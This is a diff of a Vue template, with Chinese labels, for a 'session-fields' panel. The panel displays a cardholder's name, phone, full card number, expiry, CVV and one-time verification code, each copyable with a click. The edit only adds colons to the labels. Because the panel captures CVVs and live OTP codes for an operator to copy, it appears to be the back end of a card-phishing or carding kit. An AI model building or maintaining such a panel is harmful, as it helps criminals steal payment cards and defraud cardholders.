@@ -31,20 +31,20 @@ function copy(val: string) {
 <template>
   <div class="session-fields">
     <div class="field field-wide" v-if="cardInfo.cardType" @click="copy(cardInfo.cardType)">
-      <label>卡类型</label>
+      <label>卡类型：</label>
       <span class="value card-type-badge" :style="{ color: cardIcon.color, borderColor: cardIcon.color }">
         <svg width="18" height="18" viewBox="0 0 24 24"><path :stroke="cardIcon.color" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 8a3 3 0 0 1 3-3h12a3 3 0 0 1 3 3v8a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3zm0 2h18M7 15h.01M11 15h2"/></svg>
         <span class="ct-text">{{ cardIcon.type }}<span v-if="(cardInfo as any).cardCountry"> | {{ (cardInfo as any).cardCountry }}</span></span>
       </span>
     </div>
-    <div class="field" v-if="cardInfo.cardLevel" @click="copy(cardInfo.cardLevel)"><label>卡级</label><span class="value">{{ cardInfo.cardLevel }}</span></div>
-    <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)"><label>发卡行</label><span class="value">{{ cardInfo.bankName }}</span></div>
-    <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)"><label>电话</label><span class="value">{{ customerInfo.phone }}</span></div>
-    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
-    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)"><label>卡号</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
-    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期</label><span class="value">{{ cardInfo.expiry }}</span></div>
-    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV</label><span class="value">{{ cardInfo.cvv }}</span></div>
-    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
+    <div class="field" v-if="cardInfo.cardLevel" @click="copy(cardInfo.cardLevel)"><label>卡级：</label><span class="value">{{ cardInfo.cardLevel }}</span></div>
+    <div class="field field-wide" v-if="cardInfo.bankName" @click="copy(cardInfo.bankName)"><label>发卡行：</label><span class="value">{{ cardInfo.bankName }}</span></div>
+    <div class="field" v-if="customerInfo.phone" @click="copy(customerInfo.phone)"><label>电话：</label><span class="value">{{ customerInfo.phone }}</span></div>
+    <div class="field field-wide" v-if="cardInfo.cardHolder" @click="copy(cardInfo.cardHolder)"><label>持卡人：</label><span class="value">{{ cardInfo.cardHolder }}</span></div>
+    <div class="field field-card" v-if="cardInfo.cardNumber" @click="copy(cardInfo.cardNumber)"><label>卡号：</label><span class="value value-green">{{ cardInfo.cardNumber }}</span></div>
+    <div class="field" v-if="cardInfo.expiry" @click="copy(cardInfo.expiry)"><label>有效期：</label><span class="value">{{ cardInfo.expiry }}</span></div>
+    <div class="field" v-if="cardInfo.cvv" @click="copy(cardInfo.cvv)"><label>CVV：</label><span class="value">{{ cardInfo.cvv }}</span></div>
+    <div class="field" v-if="cardInfo.otpCode" @click="copy(cardInfo.otpCode)"><label>验证码：</label><span class="value value-orange">{{ cardInfo.otpCode }}</span></div>
   </div>
 </template>
 
